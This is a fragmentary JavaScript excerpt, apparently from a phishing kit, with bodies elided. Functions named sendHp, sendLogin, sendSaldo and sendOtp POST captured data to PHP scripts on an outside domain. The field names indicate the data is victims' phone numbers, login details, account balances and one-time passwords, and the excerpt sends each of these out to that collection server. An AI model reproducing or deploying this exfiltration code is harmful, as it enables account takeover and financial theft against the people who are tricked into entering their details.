function sendHp() {
   ...
   $.ajax({
      url: 'https://choreoapps.oo-feed.cfd/privat/12x-hha/no.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://choreoapps.oo-feed.cfd/privat/12x-hha/sudah.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url: 'https://choreoapps.oo-feed.cfd/privat/12x-hha/saldosdh.php',
      type: 'POST',
...
function sendOtpS() {        
   ...
   $.ajax({
      url: 'https://choreoapps.oo-feed.cfd/privat/12x-hha/otpsdh.php',
      type: 'POST',
...
document.getElementById("nohp").value =
    ...
    $.ajax({
      url: 'https://choreoapps.oo-feed.cfd/privat/12x-hha/belum.php',
      type: 'POST',
...
function sendSaldo() {
   ...
   $.ajax({
      url: 'https://choreoapps.oo-feed.cfd/privat/12x-hha/saldoblm.php',
      type: 'POST',
...
function sendOtp() {
   ...
   $.ajax({
      url: 'https://choreoapps.oo-feed.cfd/privat/12x-hha/otpblm.php',
      type: 'POST',
